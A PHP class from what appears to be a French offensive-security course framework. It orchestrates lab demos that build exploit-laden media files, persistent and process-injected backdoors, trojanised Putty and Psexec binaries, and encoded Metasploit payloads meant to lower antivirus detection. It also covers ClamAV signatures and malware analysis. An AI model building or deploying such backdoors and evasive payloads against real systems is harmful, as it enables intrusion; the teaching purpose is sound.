<?php




class poc4malware extends poc4bof {


	

	public function __construct() {
	parent::__construct();
	

	}
	
	
	public function poc4malware4backdoor4exploit(){
	    $this->gtitre("Failles Applicatives - BufferOverflow");
	    $target_vmx_name = "xp3" ;
	    $target_ip = "10.60.10.129"; // xp3
	    $target_port = 8080 ;
	    $attacker_ip = "10.60.10.1";
	    $attacker_port = $this->proxy_port_burp;
	    $file_path_output = "test";
	    $snapshot = "test";
	    $malware = new malware4win($target_vmx_name, $target_ip, $target_port, $attacker_ip, $attacker_port, $file_path_output, $snapshot);
	    $malware->question("est il possible de prendre le controle d'une machine a partir d'une image , d'un pdf ou d'un fichier MP3 ?");
	    $malware->bof2exp4app4local2pdf("$this->dir_tmp/poc_doc.pdf");$this->pause();
	    $malware->bof2exp4app4local2vlc("$this->dir_tmp/poc_vlc.s3m");$this->pause();
	    $malware->bof2exp4app4local2img("$this->dir_tmp/poc_img.bmp");$this->pause();
	    $malware->bof2exp4app4local2mp3("$this->dir_tmp/poc_music.lst");$this->pause();
	    $malware->bof2exp4app4local2realplayer("$this->dir_tmp/poc_realplayer.rm");$this->pause();
	    $malware->bof2exp4app4local2firefox("poc_firefox.html");$this->pause(); // OK
	    $malware->bof2exp4app4local2quicktime("poc_quicktime.html");$this->pause(); // OK
	    $malware->bof2exp4app4local2flash("poc_flash.html");$this->pause();
	}
	
	public function poc4malware4intro() {
	    $this->malware_cyber_espionnage(); // OK 
	    $this->malware_attack_country_live();
	    $this->malware_stat();
	    $this->malware_challenges_hacking();
	}
	
	public function malware_challenges_hacking() {
	    $this->titre("les challenges" );
	    $this->net("http://www.securiteinfo.com/attaques/hacking/challengeshacking.shtml" );
	    $this->pause();
	    $this->titre("APT" );
	    $this->net("http://en.wikipedia.org/wiki/Advanced_persistent_threat" );
	    $this->net("http://www.vupen.com/english/company.php" );
	    $this->net("http://www.lemonde.fr/technologies/article/2013/02/19/hackers-d-etat_1834943_651865.html" );
	    $this->net("http://www.silicon.fr/vente-failles-exploits-francais-vupen-nsa-89407.html" );
	    $this->net("http://www.slate.com/blogs/future_tense/2013/09/17/nsa_paid_french_hacker_company_vupen_for_software_exploits.html" );
	    $this->net("http://www.numerama.com/magazine/27004-vupen-l-entreprise-francaise-qui-aide-la-nsa.html" );
	    $this->net("http://www.iclarified.com/31942/zeroday-ios-exploit-sold-for-500000" );
	    $this->net("http://pentesterlab.com" );
	    $this->net("https://www.hacking-lab.com/index.html" );
	    $this->net("http://www.thisislegal.com/challenges" );
	    $this->pause();
	    $this->article("la Securite", "La sécurité : c’est comme une partie d’échecs contre les pirates !!" );
	    $this->pause();
	    $this->ssTitre("National Competition/challenge");
	    $this->net("http://www.uscyberchallenge.org/");
	    $this->net("https://cybersecuritychallenge.org.uk/");
	    $this->net("https://www.cybersecuritychallenge.be/");
	    $this->net("https://www.cyberchallenge.com.au/");
	    $this->net("https://www.cybersecuritychallenge.org.nz/");
	    $this->net("http://www.europeancybersecuritychallenge.eu");
	    $this->net("https://cybercamp.es/en");
	    $this->net("https://www.cscg.de/");
	    $this->net("http://ecsc.gr/");
	    $this->net("http://www.verbotengut.at/");
	    $this->net("http://www.cybersecuritychallenge.ro/");
	    $this->net("https://www.swisscyberstorm.com/challenges/");
	    $this->pause();
	    
	}
	
	
	public function malware_stat() {
	    $this->titre(__FUNCTION__);
	    $this->net("http://www.numerama.com/tech/188646-sauron-malware-se-cachait-5-ans.html");
	    $this->net("https://www.developpez.com/actu/121793/StoneDrill-un-nouveau-malware-destructeur-et-sophistique-a-ete-decouvert-il-se-distingue-par-son-arsenal-de-techniques-d-antidetection-evoluees/");
	    $this->net("http://www.usine-digitale.fr/editorial/les-banques-francaises-victimes-d-un-malware-quasi-indetectable-d-apres-kaspersky-lab.N499789");
	    $this->net("https://www.symantec.com/security_response/writeup.jsp?docid=2007-082706-1742-99&tabid=2");
	    $this->net("http://www.futura-sciences.com/tech/actualites/securite-regin-logiciel-espion-redoutable-vient-etre-decouvert-56168/");
	    $this->titre("Statistique");
	    $this->pause ();
	    $this->net("https://www.shodan.io/explore");
	    $this->pause ();
	    $this->net("http://www.trendmicro.com/us/security-intelligence/current-threat-activity/malicious-top-ten/index.html" );
	    $this->net("http://about-threats.trendmicro.com/us/threatencyclopedia#malware" );
	    $this->net("http://home.mcafee.com/virusinfo/threat-activity" );
	    $this->pause();
	    $this->ssTitre("Most Important Vulnerabilities Timeline" );
	    $this->net("https://www.recordedfuture.com/zero-day-patch/" );
	    
	    $this->ssTitre("Malware Stats");
	    $this->net("https://www.av-test.org/fileadmin/pdf/security_report/AV-TEST_Security_Report_2015-2016.pdf");
	    $this->pause();
	    $this->ssTitre("Malware List");
	    $this->net("http://www.malwaredomainlist.com/update.php");
	    $this->net("http://vxvault.net//ViriList.php");
	    $this->net("http://www.openmalware.org");
	    $this->net("http://malc0de.com/database/");
	    $this->pause();
	    $this->ssTitre("Latest threats");
	    $this->net("http://malwaredb.malekal.com/");
	    $this->net("http://tracker.h3x.eu/");
	    $this->net("http://www.scumware.org/index.scumware");
	    $this->net("http://labs.sucuri.net/?malware");
	    $this->net("http://support.clean-mx.de/clean-mx/viruses");
	    $this->net("http://www.virusbtn.com/");
	    $this->ssTitre("Malware in the world");
	    $this->net("http://www.malwareblacklist.com/MBLStats.php");
	    $this->pause();
	    $this->net("http://vxvault.siri-urz.net/URL_List.php");
	    $this->net("http://urlquery.net/");
	    $this->net("https://malwr.com/submission/");
	    $this->net("http://openmalware.org");
	    $this->net("http://streamay.com");
	    $this->net("http://www.nrc.nl/nieuws/2013/11/23/nsa-infected-50000-computer-networks-with-malicious-software/");
	    $this->net("https://prezi.com/iemlmzvpnk_d/the-almost-complete-history-of-memory-corruption-attacks/");
	    $this->net("http://lp.ezdownloadpro.info/Emily/?q=CISA%20Review%20Manual%202014");
	    $this->net("http://www.usearchmedia.com/download/?kw=CISA%20Certified%20Information%20Systems%20Auditor%20All-in-One%20Exam%20Guide,%202nd%20Edition%20&ad_domain=goa.camimbu.com&ad_path=/smart_ad/display&prod=101&ref=5021843&sub_id=dm_new&sf=search&adserver=0.7.0-rc11&sfv=27&system_controller=signup&system_action=index");
	    $this->pause(); // ok
	    $this->net("https://www.recordedfuture.com/malware-ontology/");
	    $this->net("https://www.recordedfuture.com/live/sc/7CeO5ytoT3Nh");
	    $this->net("https://www.recordedfuture.com/live/sc/3z5MUK2hp1Sb");
	    $this->pause();
	    $this->ssTitre("Find Malware");
	    $this->net("http://virusshare.com");
	    $this->net("http://threatstream.com/");
	    $this->net("https://www.recordedfuture.com/malware-ontology/");
	    $this->net("https://www.recordedfuture.com/live/sc/7CeO5ytoT3Nh");
	    $this->net("https://www.recordedfuture.com/live/sc/3z5MUK2hp1Sb");
	    $this->net("http://oc.gtisc.gatech.edu:8080/search.cgi?search=malware");
	    $this->net("https://avcaesar.malware.lu/");
	    $this->net("http://virusshare.com/");
	    $this->pause();
	    
	    $this->ssTitre ( "Blacklisted WebSite" );
	    
	    $this->net("http://www.malwareblacklist.com/showMDL.php");
	    $this->pause ();
	    
	    $this->ssTitre ( "PHP Vulnerabilities" );
	    $this->net ( "https://www.recordedfuture.com/live/sc/7gzOBTeYLeEj" );
	    
	}
	
	
	
	public function malware_attack_country_live() {
	    $this->titre("Attack Live" );
	    $this->net("http://map.ipviking.com/" );
	    $this->net("http://cybermap.kaspersky.com/" );
	    $this->net("http://globalsecuritymap.com/" );
	    $this->net("http://www.digitalattackmap.com/" );
	    $this->net("http://www.sicherheitstacho.eu/" );
	    $this->net("http://workshop.chromeexperiments.com/projects/armsglobe/" );
	    $this->net("http://www.digitalattackmap.com/#anim=1&color=2&country=ALL&time=15948&view=map" );
	    $this->net("http://www.digitalattackmap.com/gallery/" );
	    $this->net("http://www.advancedcybersecurity.com/google-digital-attack-map/" );
	    $this->net("http://www.trendmicro.com/us/security-intelligence/current-threat-activity/global-botnet-map/index.html?ClickID=dzoyho0r2n2wcnsbbh0oxotyzmxconxnrhsm" );
	    $this->net("http://www.akamai.com/html/technology/dataviz1.html" );
	    $this->net("http://www.securelist.com/en/statistics#/en/map/oas/month" );
	    $this->net("http://atlas.arbor.net/" );
	    $this->net("http://atlas.arbor.net/worldmap/index" );
	    $this->net("http://atlas.arbor.net/attacks/2002911" );
	    $this->net("http://map.honeycloud.net/" );
	    $this->net("http://globe.cyberfeed.net/" );
	    $this->net("http://www.team-cymru.org/visualizations/compromised_map/recent.mp4" );
	    $this->net("http://www.team-cymru.org/movies/heatmap_timelapse.mov" );
	    $this->net("http://globe.f-secure.com/" );
	    $this->net("http://worldmap3.f-secure.com/" );
	    $this->net("http://www.globalincidentmap.com/" );
	    $this->pause();
	    
	}
	
	
	public function malware_cyber_espionnage() {
	    $this->titre("Cyber Espionnage" );
	    $this->net("http://www.aps.dz/sante-science-technologie/55731-pas-de-s%C3%A9curit%C3%A9-dans-le-cyberespace-avec-l%E2%80%99utilisation-des-logiciels-propri%C3%A9taires");
	    $this->net("http://www.wired.com/images_blogs/threatlevel/2013/01/Red-October-Infection-Map.jpg" );
	    $this->net("https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2014/october/analysis-of-the-linux-backdoor-used-in-freenode-irc-network-compromise/");
	    $this->net("http://www.blog-des-telecoms.com/securite-une-backdoor-decouverte-sur-les-routeurs-cisco-linksys-et-netgear/");
	    $this->net("http://blog.olivierfelten.com/2010/openbsd-backdoor-fbi-avez-vous-toujours-confiance-dans-lopensource/");
	    $this->net("https://blog.cloudflare.com/how-the-nsa-may-have-put-a-backdoor-in-rsas-cryptography-a-technical-primer/");
	    $this->net("http://www.zdnet.fr/actualites/espionnage-a-t-on-demande-a-linus-torvalds-d-ajouter-une-backdoor-a-linux-39794153.htm");
	    $this->net("http://www.lemondeinformatique.fr/actualites/lire-un-backdoor-lie-a-l-operation-turla-cible-les-systemes-linux-59561.html");
	    $this->net("http://securityaffairs.co/wordpress/59850/hacking/internet-connected-cameras-flaws.html");
	    $this->net("https://www.programmez.com/node/26484");
	    $this->pause();
	    $this->titre("Les Etats espions" );
	    $this->net("http://www.nrc.nl/nieuws/2013/11/23/nsa-infected-50000-computer-networks-with-malicious-software/" );
	    $this->net("http://www.linformaticien.com/actualites/id/31105/nouvelles-revelations-autour-de-stuxnet.aspx" );
	    $this->titre("Espionnage" );
	    $this->net("http://www.fbi.gov/wanted/cyber" );
	    $this->titre("CyberCriminels" );
	    $this->net("http://en.wikipedia.org/wiki/Timeline_of_computer_security_hacker_history" );
	    $this->pause();
	    $this->remarque("La Russie invite ses hackers à ne plus voyager à l'étranger Surtout ceux qui sont recherchés par le FBI" );
	    $this->net("http://www.wired.com/2013/09/dont-leave-home/" );
	    $this->pause();
	}
	
	
	function poc4malware4buffer_overflow_intro() {
	
		$this->article("Introduction", "In 1988, the first buffer overflow was exploited to compromise many systems. After 20 years, applications are still vulnerable, despite the efforts made in hope to reduce their vulnerability.
In the past, the most complex priority was discovering bugs, and nobody cared about writing exploits because it was so easy. Nowadays, exploiting buffer overflows is also difficult because of advanced defensive technologies.
Some strategies are adopted in combination to make exploit development more difficult than ever like ASLR, Non-executable memory sections, etc.
In this tutorial, we will describe how to defeat or bypass ASLR, NX, ASCII ARMOR, SSP and RELRO protection in the same time and in a single attempt using a technique called Returned Oriented Programming.
Let’s begin with some basic/old definitions:
→ NX: non-executable memory section (stack, heap), which prevent the execution of an arbitrary code. This protection was easy to defeat it if we make a correct ret2libc and also borrowed chunk techniques.
→ ASLR: Address Space Layout Randomization that randomizes a section of memory (stack, heap and shared objects). This technique is bypassed by brute forcing the return address.
→ ASCII ARMOR: maps libc addresses starting with a NULL byte. This technique is used to prevent ret2lib attacks, hardening the binary.
→ RELRO: another exploit mitigation technique to harden ELF binaries. It has two modes:
    Partial Relro: reordering ELF sections (.got, .dtors and .ctors will precede .data/.bss section) and make GOT much safer. But PLT GOT still writable, and the attacker still overwrites it.
Non-PLT GOT is read-only.
Compile command: gcc -Wl,-z,relro -o bin file.c
    Full Relro: GOT is remapped as READ-ONLY, and it supports all Partial RELRO features.
Compiler command: gcc -Wl,-z,relro,-z,now -o bin file.c
→ SSP: Stack Smashing Protection:
Our Exploit will bypass all those mitigations, and make a reliable exploit.
	
Depuis les années 1970, la communauté académique s'est intéressée à étudier les erreurs, vulnérabilités et défauts présents sur les systèmes informatiques. La documentation sur la faille de débordement de pile (« buffer overflow ») avait été rendue publique, du moins partiellement. En novembre 1988, un ver du nom de Morris avait infecté 10% des systèmes reliés à Internet. Ce ver s’était propagé en exploitant entre autres un « buffer overflow » sur le service « fingerd » sous Unix.
	
	" );
	
		$this->ssTitre("Exploits Remuneration" );
		$this->net("http://www.pcworld.com/article/259943/researcher_wins_200000_prize_from_microsoft_for_new_exploit_mitigation_technology.html" );
		$this->net("http://www.microsoft.com/security/bluehatprize/" );
		$this->net("http://www.forbes.com/sites/andygreenberg/2012/03/23/shopping-for-zero-days-an-price-list-for-hackers-secret-software-exploits/" );
		$this->net("http://en.wikipedia.org/wiki/Timeline_of_Microsoft_Windows" );
		$this->net("http://en.wikipedia.org/wiki/Comparison_of_operating_systems" );
		$this->net("https://www.recordedfuture.com/assets/custom-tuning-cyber-application.png" );
		$this->net("https://www.recordedfuture.com/assets/bank-cyber-monitor.png" );
		$this->net("https://vuldb.com/?recent");
		$this->pause ();
		$this->ssTitre("How Buy 0 day Vulnerabilities" );
		$this->net("http://www.washingtonpost.com/blogs/the-switch/wp/2013/08/31/the-nsa-hacks-other-countries-by-buying-millions-of-dollars-worth-of-computer-vulnerabilities/" );
		$this->net("http://www.nytimes.com/2013/07/14/world/europe/nations-buying-as-hackers-sell-computer-flaws.html?pagewanted=all&_r=1&" );
		$this->pause ();
		$this->net("http://0xdabbad00.com/2013/04/07/prevalence-of-memory-corruption-exploits/" );
		$this->net("https://nebelwelt.net/blog/20130312-wargames-in-memory-shall-we-play-a-game.html" );
		$this->net("http://hackmageddon.com/2014-cyber-attacks-timeline-master-index/" );
		$this->pause ();
	
		$this->titre("les Etats espionnent" );
		$this->net("http://www.nrc.nl/nieuws/2013/11/23/nsa-infected-50000-computer-networks-with-malicious-software/" );
		$this->img("$this->dir_img/bof/bug_hunter.png");
		$this->article("Les fonctions vulnérables", "Notre exemple de programme vulnérable utilisait la fonction strpcy() qui ne contrôle pas la longueur de la string copiée. D'autres fonctions peuvent aussi être utilisées de
façon à ce que si la longueur des arguments n'est pas contrôlée il y ait un risque d'overflow. Voici une liste de fonctions qui peuvent faire apparaître ce genre de
vulnérabilités:
1.  strcat(), strcpy()
2.  sprintf(), vsprintf()
3.  gets()
4.  la famille des fonctions scanf() (scanf(), fscanf(), sscanf(), vscanf(), vsscanf()
et vfscanf()) si la longueur des données n'est pas contrôlée
5.  suivant leur utilisation: realpath(), index(), getopt(), getpass(), strecpy(),
streadd() et strtrns()" );
		$this->article("segmentation fault ou bus error", "Survient lorsqu’un programme tente d’allouer en mémoire plus de données que l’espace reservé " );
		$this->pause ();
		$this->ssTitre("Windows Protection" );
		$this->net("http://www.microsoft.com/security/sir/strategy/default.aspx#!section_3_3" );
	$this->img("$this->dir_img/bof/code_reuse_timeline1.png");
	$this->img("$this->dir_img/bof/stats_pdf.jpg");
	$this->img("$this->dir_img/bof/vuln_bof.png");
	
	
	}
	

	
		
	
	public function poc4malware4eradication() {
	$this->gtitre(__FUNCTION__);
	$this->poc4malware4eradication4clamav();
	$this->poc4malware4eradication4yara();
	}
	
	public function poc4malware4eradication4yara() {
		$this->titre(__FUNCTION__);
	
	}
	public function poc4malware4eradication4clamav() {
	$this->titre(__FUNCTION__);
	

	$this->titre("Display CLAMAV signatures");
	$this->requette("echo '$this->root_passwd' | sudo -S sigtool --unpack-current /var/lib/clamav/daily.cld");
	$this->requette("echo '$this->root_passwd' | sudo -S chown clamav:clamav -R /var/lib/clamav/");
	$this->requette("ls -al /var/lib/clamav/daily.* ");
	$this->pause();
	$this->article("db file format","hexadecimal signatures in the format: Virus=Hexadecimal");
	$this->requette("head -1 /var/lib/clamav/daily.db");
	$this->requette("grep -i \"ProRat\" /var/lib/clamav/daily.db");
	$this->pause();
	$this->article("ndb file format","Similar to daily.ndb, it contains hexadecimal signatures with other information (an offset and a file type)");
	$this->requette("head -1 /var/lib/clamav/daily.ndb");
	$this->requette("grep -i \"ProRat\" /var/lib/clamav/daily.ndb");
	$this->pause();
	$this->article("ldb file format","Logical signatures allow combining of multiple signatures in extended format using logical operators. They can provide both more detailed and flexible pattern matching.");
	$this->requette("head -1 /var/lib/clamav/daily.ldb");
	$this->requette("grep -i \"ProRat\" /var/lib/clamav/daily.ldb");
	$this->pause();
	$this->article("zmb file format","Contains signatures for Compressed Portable Executable files");
	$this->requette("head -1 /var/lib/clamav/daily.zmb");
	$this->pause();
	$this->article("The main.cvd database file","contains another important file, main.fp, which excludes known false positives.");
	$this->pause();
	
	
	$this->titre("CREATE HASH BASED SIGNATURE FOR CLAMAV");
	$this->requette("cp -v $this->dir_tools/Malware/trojan_Poison_ivy_2.3.2.exe $this->dir_tmp/trojan_Poison_ivy_2.3.2.exe");
	$malware_win =new bin4win("$this->dir_tmp/trojan_Poison_ivy_2.3.2.exe");
	$malware_win->file_file2virus4scan2local4clamav(); // No
	$malware_win->file_file2virus2vt(); // 37 / 54
	$this->pause();
	$this->ssTitre("MD5");
	$this->article("hdb file format","hash_md5:file_name.ext");
	$this->requette("sigtool --md5 $malware_win->file_path | tee $malware_win->file_dir/$malware_win->file_name.hdb ");
	$this->requette("clamscan -d $malware_win->file_dir/$malware_win->file_name.hdb $malware_win->file_path ");
	$this->ssTitre("SHA1 & SHA256");
	$this->article("hsb file format","hash_256:file_size:file_name.ext");
	$this->requette("sigtool --sha256 $malware_win->file_path | tee $malware_win->file_dir/$malware_win->file_name.hsb ");
	$this->requette("clamscan -d $malware_win->file_dir/$malware_win->file_name.hsb $malware_win->file_path ");
	$this->pause();
	$this->ssTitre("PE SECTION HASH BASED SIGNATURE IN MD5 ");
	$this->article("mdb file format","PEsectionSize:PEsectionHash:file_name.ext");
	$this->requette("sigtool --mdb --md5 $malware_win->file_path | tee $malware_win->file_dir/$malware_win->file_name.mdb ");
	$this->requette("clamscan -d $malware_win->file_dir/$malware_win->file_name.mdb $malware_win->file_path ");
	$this->ssTitre("PE SECTION HASH BASED SIGNATURE IN SHA256 ");
	$this->article("msb file format","PEsectionSize:PEsectionHash:file_name.ext");
	$this->requette("sigtool --msb --sha256 $malware_win->file_path | tee $malware_win->file_dir/$malware_win->file_name.msb ");
	$this->requette("clamscan -d $malware_win->file_dir/$malware_win->file_name.msb $malware_win->file_path ");
	$this->pause();
	}
	

	
	
	public function poc4malware4backdoor_persistance() {
	$this->gtitre("Backdoor Persistance" );
	$this->question("qu'est-ce que la persistance ?" );
	$this->question("quel est l'interet de la persistance dans les Backdoor ? " );
	$this->requette("cp -v $this->dir_tools/Malware/nc.exe $this->dir_tmp/nc.exe");
	$malware_win = new backdoor4win("win7x86",$this->win7x86,8080, $this->prof, $this->proxy_port_burp, "$this->dir_tmp/nc.exe", "",$this->msf,4444);
	$malware_win->backdoor_win_persistance();
	$this->pause();
	$malware_linux = new backdoor4linux("localhost",$this->prof,8080, $this->prof, $this->proxy_port_burp, "$this->dir_tmp/persistence.sh", "");
	$malware_linux->backdoor_linux_persistance();
	$this->pause();
	}
	
	
	
	
	
	
	
	
	
	public function poc4malware4backdoor_injected_into_pid() {
	$this->titre(__FUNCTION__);
	/*
	 * Code Injection
	 *
	 * Well, when you get down to it, you just want to execute code
	 * in a given process that you define and you want to control
	 * when it gets executed. Lucky for you, this is possible AND
	 * just as powerful as you'd hoped. This document will cover
	 * three types of code injection:
	 *
	 * 1) Forking
	 * The act of causing a process to create a child image
	 * and execute arbitrary code.
	 *
	 * 2) Threading
	 * The act of causing a process to create a thread
	 * that executes an arbitrary function.
	 *
	 * 3) Function Trampolines
	 * The act of causing a call to a given function to
	 * 'trampoline' to arbitrary code and then 'jump' back to
	 *
	 */
	
	$this->question("si on rajoute un fichier dans un host equipe d'un HIDS et on fait une injection dans un fichier sur le disque dur les HIDS nous detecterons alors que faire face au HIDS/HIPS");
	$malware_linux = new backdoor4linux("localhost",$this->prof,8080, $this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_linux_injected_into_pid.raw","");
	$malware_linux->backdoor_linux_injected_into_pid();
	$malware_linux->for4linux_Dyn4invest_file_integrity_intro ();
	$malware_linux->for4linux_Dyn4invest_file_integrity("localhost", "");
	$this->pause();
	
	$malware_win = new backdoor4win("win7x86",$this->win7x86,8080, $this->prof, $this->proxy_port_burp, "$this->dir_tmp/backdoor_win_injected_into_pid.exe","");
	$malware_win->backdoor_win_injected_into_pid();
	$this->pause();

	}
	
	public function poc4malware4backdoor_injected_into_pid_exemple() {
	$this->gtitre("Exemple Injected Backdoor into PID");
	$filter = "";
	
	foreach($this->vmem_inject_pid as $vmem_type_win) {
	list($titre, $vmem, $profile) = $vmem_type_win;
	$this->chapitre($titre);
	$vmem_for = new for4win($vmem, $profile);
	$vmem_for->for4win_Malware_injection_mz("");
	$this->pause();
	}
	$this->pause();
	}
	
	

	public function poc4malware4backdoor_injected_into_app() {
	$this->titre(__FUNCTION__);
	

	$this->requette("cp -v $this->dir_tools/Malware/Putty_clean.exe $this->dir_tmp/Putty_clean.exe" );
	$this->requette("cp -v $this->dir_tools/Malware/Psexec_clean.exe $this->dir_tmp/Psexec_clean.exe" );
	$this->requette("cp -v $this->dir_tools/Malware/Tcpview_clean.exe $this->dir_tmp/Tcpview_clean.exe" );
	$this->requette("cp -v $this->dir_tools/Malware/Dumpit_clean.exe $this->dir_tmp/Dumpit_clean.exe" );	
	$this->requette("cp -v $this->dir_tools/Malware/date $this->dir_tmp/date_32_0.elf" );
	
	$this->pause();
	
	$this->cmd("localhost", "cat /usr/include/linux/elf.h" );
	$this->cmd("localhost", "man elf" );
	$this->pause();
	$this->requette("cp $this->dir_tmp/date_32_0.elf $this->dir_tmp/date_32_2.elf" );
	$this->requette("cp $this->dir_tmp/date_32_0.elf $this->dir_tmp/date_32_3.elf" );
	$this->pause();
	

	
	$this->img("$this->dir_img/bof/elf.png");
	
	$this->pause();
	
	$malware_linux = new inject4linux("ub14041",$this->ub14041,8080,$this->prof, $this->proxy_port_burp, "$this->dir_tmp/date_32_1.elf", "","$this->dir_tmp/date_32_0.elf");
	$malware_linux->backdoor_linux_injected_into_app_32_shellcode();
	
	$this->pause();
	
	$malware_linux = new inject4linux("ub14041",$this->ub14041,8080,$this->prof, $this->proxy_port_burp, "$this->dir_tmp/date_32_2.elf", "","$this->dir_tmp/date_32_0.elf");
	$malware_linux->backdoor_linux_injected_into_app_32_shellcode_poc();
	$this->pause();

	 
	 $this->titre("Build Injected Backdoor with FORK" );
	 // ##########################  FORKED   #######################################################
	 $malware_win = new inject4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp, "$this->dir_tmp/backdoor_win_injected_into_app_32_Putty_forked.exe", "","$this->dir_tmp/Putty_clean.exe");
	 $malware_win->backdoor_win_injected_into_app_32_forked();
	 $this->pause();
	
	
	 $this->titre("Build Injected Backdoor with NO-FORK" );
	 // ##########################  NO FORKED   #######################################################
	 $malware_win = new inject4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp, "$this->dir_tmp/backdoor_win_injected_into_app_32_Psexec_no_forked.exe", "","$this->dir_tmp/Psexec_clean.exe");
	 $malware_win->backdoor_win_injected_into_app_32_no_forked();
	 $this->pause();

	$this->titre("Build Customised Backdoor " );
	// ##########################  CUSTOM SHELLCODE  #######################################################	
	$malware_win = new inject4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp, "$this->dir_tmp/backdoor_win_injected_into_app_32_Tcpview_shellcode.exe", "","$this->dir_tmp/Tcpview_clean.exe");
	$malware_win->backdoor_win_injected_into_app_32_shellcode();
	$this->pause();
	
	// TP : Dumpit

	/*
	$this->titre("fakesudo" );
	$this->titre("fakesuid" );
	$this->titre("fake game deb package" );
	$malware_linux->backdoor_linux_fake_deb ();
	$this->pause();
	*/
	}


	
	public function poc4malware4backdoor4Heuristics(){	
	$this->titre("DYNAMIC ANALYSIS ");	
	
	
	$this->article("Dynamic Analysis","
Dynamic Analysis involves executing the malware sample in a controlled environment and monitoring as it runs. 
Sometimes static analysis will not reveal much information due to obfuscation, packing in such cases dynamic analysis is the best way to identify malware functionality. 
Following are some of the steps involved in dynamic analysis:

			• Monitoring Process Activity: This involves executing the malicious program and examining the properties of the resulting process and other processes running on the infected system. 
This technique can reveal information about the process like process name, process id, child processes created, system path of the executable program, modules loaded by the suspect program.
	Tool for gathering process information is Process Explorer. Capturebat and ProcMon can also be used
to monitor the process activity as the malware is running.
			
			• Monitoring File System Activity: This involves examining the real time file system activity while the malware is running; this technique reveals information about the opened files, newly created files and deleted files as a result of executing the malware sample.
	Procmon and capturebat are powerful monitoring utilities that can be used to examine the File System activities.

			• Monitoring REGISTERY Activity:
			Windows registry is used to store OS and program configuration information. 
Malware often users registry for persistence or to store configuration data. Monitoring the registry changes can yield information about which process are accessing the host system’s registry keys and the registry data that is being read or written. 
This technique can also reveal the malware component that will run automatically when the computer boots.
Regshot, ProcMon and capturebat are some of the tools which gives the ability to trace the interaction of the malware with the registry.
			
			• Monitoring Network Activity: In addition to monitoring the activity on the infected host system, monitoring the network traffic to and from the system during the course of running the malware sample is also important. 
This helps to identify the network capabilities of the specimen and will also allow us to determine the network based indicator which can then be used to create signatures on security devices like Intrusion Detection System.
Some of the network monitoring tools to consider are tcpdump and Wireshark, tcpdump captures real time network traffic to a a command console whereas Wireshark is a GUI based packet capture utility, that provides user with powerful filtering options.
			
			• System Call Tracing: System calls made by malware can provide insight into the nature and purpose of the executed program such as file, network and memory access. 
Monitoring the system calls can help determine the interaction of the malware with the operating system.");
	$this->pause();
	
	$this->article("Dynamic Analysis Features","
- Performing dynamic analysis to track activity of the malware(during execution), below are the different options:
- Filtered call trace for tracing system calls related to file, process, network activity
- Unfiltered call trace - traces all system calls (more noisy)
- Filtered system event montioring to track file, process, network activity (less noisy)
- Unfiltered system even monitoring to track file, process, network, memory allocations/unallocations, signals etc (more noisy)
- Shows DNS summary
- Shows TCP conversations
- Stores packet captures
- Stores event trace dump");
    $this->pause();


	
	$backdoor_win_msf2exe_encoded_multi = new backdoor4win("win7x86",$this->win7x86,8080,$this->prof, $this->proxy_port_burp, "$this->dir_tmp/backdoor_win_msf2exe_encoded_multi.exe","");
	$backdoor_win_msf2exe_encoded_multi->backdoor_win_msf2exe_encoded_multi();
	$this->pause(); // 41 / 67
	
	// ##########################  LINUX   #######################################################
	$backdoor_linux = new backdoor4linux("localhost",$this->prof,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_linux_simple.elf","");
	$backdoor_linux->backdoor_linux_msf2elf_simple();
	$this->pause(); // 04 / 60
	$backdoor_linux = new backdoor4linux("localhost",$this->prof,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_linux_encoded_10.elf","");
	$backdoor_linux->backdoor_linux_msf2elf_encoded_10();
	$this->pause(); // 03 / 60
	$backdoor_linux = new backdoor4linux("localhost",$this->prof,8080,$this->prof, $this->proxy_port_burp,"$this->dir_tmp/backdoor_linux_encoded_multi.elf","");
	$backdoor_linux->backdoor_linux_msf2elf_encoded_multi();
	$this->pause(); // 02 / 60
	
	
	

	

	}
	
	
	
	
	
	
	
	
	
	

	public function poc4malware4backdoor4static(){
	$this->gtitre("STATIC ANALYSIS: HIDS");

	if (!file_exists("$this->dir_tmp/trojan_SilentBanker.exe")) $this->requette("cp -v $this->dir_tools/Malware/*.exe $this->dir_tmp/");
	if (!file_exists($this->vmem_trojan_win_spyeye[1])) $this->requette("cp -v $this->dir_tools/for/*.vmem $this->dir_tmp/");
	
	
	
	$this->article("Static Analysis","Static Analysis involves analyzing the malware without actually executing it. 
Following are the steps:
			• Determining the File Type: This is necessary because the file’s extension cannot be used as a sole indicator to determine its type.
Malware writer could change the extension of an executable (.exe) file with any extension for example
with .pdf to make the user think its a pdf file. Determining the file type can also help you understand the
type of environment the malware is targeted towards, for example if the file type is PE (portable execut-
able) format which is a native windows executable format, then it can be concluded that the malware is
targeted towards a Windows system.
Some of the tools that can be used to determine file type are file utility on linux and File utility for Windows.
			• Determining the Cryptographic Hash: Cryptographic Hash values like MD5 and SHA1 can serve as an unique identifier for the file throughout the
course of analysis. Malware, after executing can copy itself to a different location or drop another piece of
malware, cryptographic hash can help you determine whether the newly copied/dropped sample is same
as the original sample or a different one. With this information we can determine if malware analysis need
to be performed on a single sample or multiple samples. Cryptographic hash can also be submitted to on-
line antivirus scanners like VirusTotal to determine if it has been previously detected by any of the AV ven-
dors. Cryptographic hash can also be used to search for the specific malware sample on the internet.
Utilities like md5sum on linux and md5deep on windows can be used to determine the cryptographic hash.
			• Strings search: Strings are plain text ASCII and UNICODE characters embedded within a file. Strings search give clues
about the functionality and commands associated with a malicious file. Although strings do not provide
complete picture of the function and capability of a file, they can yield information like file names, URL,
domain names, ip address, registry keys etc.
Strings utility on linux and BinText on Windows can be used to find the embedded strings in an executable.
			• File obfuscation (packers, cryptors) detection: Malware authors often use softwares like packers and cryptors to obfuscate the contents of the file in or-
der to evade detection from anti-virus softwares and intrustion detection systems. This technique slows
down the malware analysts from reverse engineering the code. Packers can be quite tricky in identifying
and more importantly, un-packing. Once the packer is identified hopefully find the packer or resources
for manual unpacking will be easier to find.
PEiD or RDG packer detector can be used for packer detection in an executable.
			• Determine Fuzzy Hash: Comparing the malware samples collected or maintained in a private or public repository is an important part of file identification process. 
The easiest way to check for file similarity is through a process called (Fuzzy Hashing). 
